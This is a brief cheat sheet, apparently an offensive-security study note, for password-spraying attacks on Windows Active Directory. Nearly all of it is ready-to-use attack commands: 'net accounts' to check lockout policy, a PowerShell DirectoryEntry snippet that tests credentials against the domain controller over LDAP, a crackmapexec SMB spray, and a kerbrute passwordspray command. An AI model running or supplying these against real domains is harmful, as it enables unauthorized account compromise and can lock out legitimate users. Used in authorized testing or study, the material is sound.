# PASSWORD ATTACKS
#password_policies
```
net accounts
```

#spray_DirectoryEntry
```
# PASSWORD ATTACKS

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "[user]", "[password]")

# If the password for the user account is correct, the object creation will be successful
```

#spray_crackmapexec
```
# slow and noisy, can lock accounts

crackmapexec smb [ip] -u [users file] -p '[password]' -d [domain] --continue-on-success
```

#spray_request_TGT
```
kinit

kerbrute
.\kerbrute_windows_amd64.exe passwordspray -d [domain] [usernames file] "[password]"

users file must be saved as ANSI
```